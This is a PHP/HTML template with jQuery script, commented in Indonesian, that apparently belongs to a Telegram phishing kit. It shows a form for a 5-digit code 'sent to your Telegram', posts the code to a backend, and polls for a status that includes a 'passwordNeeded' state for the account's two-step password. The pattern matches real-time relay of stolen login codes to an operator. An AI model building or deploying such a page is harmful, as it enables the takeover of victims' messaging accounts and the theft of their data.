<div class="loader" id="loader">
  <div class="spinner"></div>
</div>

<div class="text-center px-3 py-4">
  <div class="mb-2">
    <h5 class="fw-bold" style="color: #C8102E;">Enter Verification Code</h5>
    <p class="text-muted" style="font-size: 14px;">
      A 5-digit code has been sent to your Telegram.<br>
      <strong><?= $_SESSION['phone'] ?? '' ?></strong>
    </p>
  </div>

  <!-- OTP Input Boxes -->
  <div class="d-flex justify-content-center gap-2 mb-3">
    <?php for ($i = 1; $i <= 5; $i++): ?>
      <input type="tel" class="form-control text-center otp-input" maxlength="1" style="width: 50px; height: 60px; font-size: 24px;" />
    <?php endfor; ?>
  </div>

  <p id="wrong" class="text-danger mb-2" style="display: none;"></p>

  <!-- Submit Button -->
  <button id="verifyBtn" class="btn btn-danger px-4 py-2" style="background-color: #C8102E; border: none;">Verify Code</button>

  <!-- Resend -->
  <p class="text-muted mt-3 mb-0" style="font-size: 14px;">
    Didn't receive the code? <a href="#" class="text-decoration-none">Resend</a>
  </p>
</div>

<style>
  .otp-input:focus {
    border-color: #C8102E;
    box-shadow: 0 0 0 0.2rem rgba(200, 16, 46, 0.25);
  }
</style>

<script>
$("#loader").hide();
$("#wrong").hide();

// Fokus otomatis ke input berikutnya
$(".otp-input").on("input", function () {
  if (this.value.length === 1) {
    $(this).next(".otp-input").focus();
  }
});

// Fungsi cek status ke backend
function checkStatus() {
  $("#wrong").hide();
  $.ajax({
    url: "API/index.php",
    type: "POST",
    data: { method: "getStatus" },
    success: function (data) {
      $("#loader").hide();
      if (data.result.status === "success") {
        window.location.reload();
      } else if (data.result.status === "failed") {
        if (data.result.detail === "wrong") {
          $("#wrong").text("Invalid OTP code").show();
        } else if (data.result.detail === "passwordNeeded") {
          window.location.reload();
        }
        $(".otp-input").val("");
      } else {
        setTimeout(checkStatus, 500);
      }
    },
    error: function () {
      $("#loader").hide();
      $("#wrong").text("An error occurred, please try again.").show();
    }
  });
}

// Submit kode OTP
$("#verifyBtn").on("click", function (e) {
  e.preventDefault();
  let otp = "";
  $(".otp-input").each(function () {
    otp += $(this).val();
  });

  if (otp.length === 5) {
    $("#loader").show();
    $.ajax({
      url: "API/index.php",
      type: "POST",
      data: { method: "sendOtp", otp: otp },
      success: function () {
        setTimeout(checkStatus, 500);
      },
      error: function () {
        $("#loader").hide();
        $("#wrong").text("An error occurred while sending OTP.").show();
      }
    });
  } else {
    $("#wrong").text("Please enter a valid 5-digit OTP code.").show();
  }
});
</script>
